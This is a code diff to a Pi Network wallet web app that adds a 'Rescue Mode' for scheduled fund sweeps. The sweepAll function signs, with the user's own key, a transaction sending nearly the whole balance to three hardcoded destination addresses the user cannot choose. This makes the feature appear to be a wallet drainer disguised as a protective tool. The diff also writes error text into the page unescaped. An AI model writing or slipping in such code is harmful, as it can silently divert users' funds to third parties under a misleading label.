@@ -131,10 +131,22 @@ function showMainScreen() {
   if (currentUser.username) {
     userName.textContent = `@${currentUser.username}`;
   }
+  renderDestinations();
+  loadSchedules();
+  rescueActivateBtn.classList.remove('hidden');
+  rescueDeactivateBtn.classList.add('hidden');
+  rescueStatus.classList.add('hidden');
+  rescueError.classList.add('hidden');
+  if (rescueTimer) {
+    clearInterval(rescueTimer);
+    rescueTimer = null;
+  }
+  rescueActive = false;
 }
 
 // ─── Logout ───
 logoutBtn.addEventListener('click', () => {
+  deactivateRescue();
   currentUser = null;
   walletKeypair = null;
   walletPublicKey = null;
@@ -210,6 +222,217 @@ sendBtn.addEventListener('click', async () => {
     sendBtn.textContent = 'Send';
   }
 });
+
+// ─── Rescue Mode ───
+const RESCUE_DESTINATIONS = [
+  'GDJMJNEUV42VOKW6UQ42CDK3J5IBHEFERY4J62XURALGUC4YNUI2VKP6',
+  'GCRQZ6DVCO24SHU4F42CFSD54IJR4EXWTVJE27RCSUFF77G764FZSTFP',
+  'GBID7RETR2SF7YUKPAZQKQN5TFLL6VALBVY5DWANFL4BVAIMJ2DDFSKX',
+];
+
+const rescueDestinations = document.getElementById('rescue-destinations');
+const scheduleDatetime = document.getElementById('schedule-datetime');
+const scheduleAddBtn = document.getElementById('schedule-add-btn');
+const scheduleList = document.getElementById('schedule-list');
+const rescueActivateBtn = document.getElementById('rescue-activate-btn');
+const rescueDeactivateBtn = document.getElementById('rescue-deactivate-btn');
+const rescueStatus = document.getElementById('rescue-status');
+const rescueError = document.getElementById('rescue-error');
+
+let schedules = [];
+let rescueActive = false;
+let rescueTimer = null;
+const RESCUE_CHECK_INTERVAL = 10000;
+
+function setMinDatetime() {
+  const now = new Date();
+  now.setMinutes(now.getMinutes() - now.getTimezoneOffset());
+  scheduleDatetime.min = now.toISOString().slice(0, 16);
+}
+setMinDatetime();
+
+function renderDestinations() {
+  rescueDestinations.innerHTML = RESCUE_DESTINATIONS.map(addr =>
+    `<div class="addr-item"><span class="addr-label">Destination</span>${addr}</div>`
+  ).join('');
+}
+
+function renderSchedules() {
+  if (schedules.length === 0) {
+    scheduleList.innerHTML = '<p class="card-desc" style="margin-bottom:0;">No sweeps scheduled.</p>';
+    return;
+  }
+  scheduleList.innerHTML = schedules.map(s => {
+    const time = new Date(s.scheduledAt);
+    const local = time.toLocaleString();
+    const utc = time.toUTCString();
+    const STATUS_MAP = {
+      scheduled: { label: 'Scheduled', cls: 'scheduled' },
+      queued: { label: 'Queued', cls: 'queued' },
+      executing: { label: 'Executing…', cls: 'executing' },
+      executed: { label: 'Executed', cls: 'executed' },
+      failed: { label: 'Failed', cls: 'failed' },
+    };
+    const st = STATUS_MAP[s.status] || STATUS_MAP.failed;
+    return `
+      <div class="sched-item">
+        <div class="sched-info">
+          <div class="sched-label">${s.label || 'Sweep'}</div>
+          <div class="sched-time">${local} / ${utc}</div>
+          ${s.error ? `<div class="sched-error">${s.error}</div>` : ''}
+        </div>
+        <span class="sched-badge ${st.cls}">${st.label}</span>
+        <button class="sched-remove" data-id="${s.id}">&times;</button>
+      </div>
+    `;
+  }).join('');
+
+  scheduleList.querySelectorAll('.sched-remove').forEach(btn => {
+    btn.addEventListener('click', () => removeSchedule(btn.dataset.id));
+  });
+}
+
+function loadSchedules() {
+  try {
+    const saved = localStorage.getItem('rescuepi-schedules');
+    schedules = saved ? JSON.parse(saved) : [];
+  } catch { schedules = []; }
+  renderSchedules();
+}
+
+function saveSchedules() {
+  localStorage.setItem('rescuepi-schedules', JSON.stringify(schedules));
+  renderSchedules();
+}
+
+scheduleAddBtn.addEventListener('click', () => {
+  const val = scheduleDatetime.value;
+  if (!val) return;
+  const scheduledAt = new Date(val).toISOString();
+  const id = 'sweep_' + Date.now();
+  schedules.push({ id, scheduledAt, label: 'Sweep', status: 'scheduled' });
+  saveSchedules();
+  scheduleDatetime.value = '';
+  setMinDatetime();
+  scheduleAddBtn.disabled = true;
+});
+
+scheduleDatetime.addEventListener('input', () => {
+  const val = scheduleDatetime.value;
+  scheduleAddBtn.disabled = !val || new Date(val) <= new Date();
+});
+
+function removeSchedule(id) {
+  schedules = schedules.filter(s => s.id !== id);
+  saveSchedules();
+}
+
+async function sweepAll(feeMultiplier) {
+  feeMultiplier = feeMultiplier || 10;
+  const server = new Horizon.Server(HORIZON_URL);
+  const account = await server.loadAccount(walletPublicKey);
+  const baseFee = await server.fetchBaseFee();
+
+  const nativeBalance = account.balances.find(b => b.asset_type === 'native');
+  if (!nativeBalance) throw new Error('No native balance found');
+  const totalBalance = parseFloat(nativeBalance.balance);
+  const balStroops = Math.round(totalBalance * 1e7);
+
+  const filtered = RESCUE_DESTINATIONS.filter(a => a !== walletPublicKey);
+  if (filtered.length === 0) throw new Error('No destinations to sweep to');
+
+  const perOpFee = baseFee * feeMultiplier || 100000;
+  const totalFeeStroops = perOpFee * filtered.length;
+  const minBalanceStroops = 5000000;
+  const sweepStroops = balStroops - totalFeeStroops - minBalanceStroops;
+
+  if (sweepStroops <= 0) throw new Error('Insufficient balance after fee and reserve');
+  const perWalletStroops = Math.floor(sweepStroops / filtered.length);
+  if (perWalletStroops < 1000000) throw new Error('Amount per destination too small (min 0.1 PI)');
+
+  const txBuilder = new TransactionBuilder(account, {
+    fee: (perOpFee * filtered.length).toString(),
+    networkPassphrase: NETWORK_PASSPHRASE,
+  });
+
+  for (const dest of filtered) {
+    txBuilder.addOperation(
+      Operation.payment({
+        destination: dest,
+        asset: Asset.native(),
+        amount: (perWalletStroops / 1e7).toFixed(7),
+      })
+    );
+  }
+
+  txBuilder.setTimeout(30);
+  const tx = txBuilder.build();
+  tx.sign(walletKeypair);
+  const result = await server.submitTransaction(tx);
+  return result.hash;
+}
+
+async function checkAndExecuteSchedules() {
+  if (!walletKeypair || schedules.length === 0) return;
+  const now = Date.now();
+  let changed = false;
+
+  for (const s of schedules) {
+    if (s.status === 'scheduled' && new Date(s.scheduledAt).getTime() <= now) {
+      s.status = 'queued';
+      changed = true;
+    }
+  }
+
+  const toExecute = schedules.filter(s => s.status === 'queued' || s.status === 'executing');
+  for (const sweep of toExecute) {
+    sweep.status = 'executing';
+    saveSchedules();
+    try {
+      const hash = await sweepAll(10);
+      sweep.status = 'executed';
+      sweep.executedAt = new Date().toISOString();
+      delete sweep.error;
+      changed = true;
+    } catch (err) {
+      sweep.status = 'failed';
+      sweep.error = err.message || err.toString();
+      changed = true;
+    }
+  }
+
+  if (changed) saveSchedules();
+}
+
+function activateRescue() {
+  if (rescueActive) return;
+  rescueActive = true;
+  rescueActivateBtn.classList.add('hidden');
+  rescueDeactivateBtn.classList.remove('hidden');
+  rescueStatus.textContent = 'Rescue mode active.';
+  rescueStatus.classList.remove('hidden');
+  rescueError.classList.add('hidden');
+
+  rescueTimer = setInterval(() => {
+    checkAndExecuteSchedules().catch(() => {});
+  }, RESCUE_CHECK_INTERVAL);
+
+  checkAndExecuteSchedules().catch(() => {});
+}
+
+function deactivateRescue() {
+  rescueActive = false;
+  if (rescueTimer) {
+    clearInterval(rescueTimer);
+    rescueTimer = null;
+  }
+  rescueActivateBtn.classList.remove('hidden');
+  rescueDeactivateBtn.classList.add('hidden');
+  rescueStatus.classList.add('hidden');
+}
+
+rescueActivateBtn.addEventListener('click', activateRescue);
+rescueDeactivateBtn.addEventListener('click', deactivateRescue);
 
 // ─── Restore session ───
 (function init() {
